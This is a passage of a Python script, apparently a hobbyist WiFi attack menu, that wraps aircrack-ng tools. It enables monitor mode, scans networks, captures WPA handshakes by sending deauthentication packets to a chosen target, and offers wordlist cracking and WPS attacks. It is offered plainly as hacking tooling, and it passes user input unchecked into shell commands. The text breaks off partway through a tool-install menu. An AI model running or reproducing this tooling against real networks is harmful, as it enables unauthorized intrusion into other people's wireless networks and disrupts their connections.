# coding: utf-8

#!/usr/bin/env python

import os

import subprocess

from subprocess import check_call

print("\nInstalling Needed Tools")

print("\n")

cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")

cmd  = os.system("sleep 3 && clear")

def intro():

    cmd  = os.system("clear")

    print("""\033[1;32m

---------------------------------------------------------------------------------------

 _   _  ___  _____ _   __ ________   __   ___  _   _______ _____ 

| | | |/ _ \/  __ \ | / / | ___ \ \ / /  / _ \| | | | ___ \  _  |

| |_| / /_\ \ /  \/ |/ /  | |_/ /\ V /  / /_\ \ | | | |_/ / | | |

|  _  |  _  | |   |    \  | ___ \ \ /   |  _  | | | |    /| | | |

| | | | | | | \__/\ |\  \ | |_/ / | |   | | | \ \_/ / |\ \\ \_/ /

\_| |_|_| |_/\____|_| \_/ \____/  \_/   \_| |_/\___/\_| \_|\___/ 

                                                        Coded By AvroLx          HACK BY AVRO

---------------------------------------------------------------------------------------                                                                     

(1)Start monitor mode       

(2)Stop monitor mode                        

(3)Scan Networks                            

(4)Getting Handshake(monitor mode needed)   

(5)Install Wireless tools                   

(6)Crack Handshake with rockyou.txt (Handshake needed)

(7)Crack Handshake with wordlist    (Handshake needed)

(8)Crack Handshake without wordlist (Handshake,essid needed)

(9)Create wordlist                                     

(10)WPS Networks attacks (Bssid,monitor mode needed)

(11)Scan for WPS Networks

 

(0)About Me

(00)Exit

-----------------------------------------------------------------------

""")

    print("\nEnter your choise here : !# ")

    var = int(input(""))

    if var == 1 :

        print("\nEnter the interface:(Default(wlan0/wlan1))")

        interface = input("")

        order = "airmon-ng start {} && airmon-ng check kill".format(interface)

        geny  = os.system(order)

        intro()

    elif var == 2 :

        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")

        interface = input("")

        order = "airmon-ng stop {} && service network-manager restart".format(interface)

        geny  = os.system(order)

        intro()

    elif var == 3 :

        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")

        interface = input("")

        order = "airodump-ng {} -M".format(interface)

        print("When Done Press CTRL+c")

        cmd = os.system("sleep 3")

        geny  = os.system(order)

        cmd = os.system("sleep 10")

        intro()

    elif var == 4 :

        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")

        interface = input("")

        order     = "airodump-ng {} -M".format(interface)

        print("\nWhen Done Press CTRL+c")

        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")

        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")

        print("\nyou Can use 's' to arrange networks")

        cmd       = os.system("sleep 7")

        geny      = os.system(order)

        print("\nEnter the bssid of the target?")

        bssid     = str(input(""))

        print("\nEnter the channel of the network?")

        channel   = int(input())

        print("Enter the path of the output file ?")

        path = str(input(""))

        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")

        print("the number of the packets Depends on the Distance Between you and the network")

        dist = int(input(""))

        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)

        geny = os.system(order)

        intro()

    elif var == 5 :

        def wire():

            cmd = os.system("clear")

            print("""

1) Aircrack-ng                          17) kalibrate-rtl

2) Asleap                               18) KillerBee

3) Bluelog                              19) Kismet

4) BlueMaho                             20) mdk3

5) Bluepot                              21) mfcuk

6) BlueRanger                           22) mfoc

7) Bluesnarfer                          23) mfterm

8) Bully                                24) Multimon-NG

9) coWPAtty                             25) PixieWPS

10) crackle                             26) Reaver

11) eapmd5pass                          27) redfang

12) Fern Wifi Cracker                   28) RTLSDR Scanner

13) Ghost Phisher                       29) Spooftooph

14) GISKismet                           30) Wifi Honey

15) Wifitap                             31) gr-scan

16) Wifite                              32) Back to main menu

90) airgeddon

91) wifite v2

 

0)install all wireless tools

""")

            w = int(input("Enter The number of the tool : >>> "))

            if w == 1 :

                cmd = os.system("sudo apt-get update && apt-get install aircrack-ng
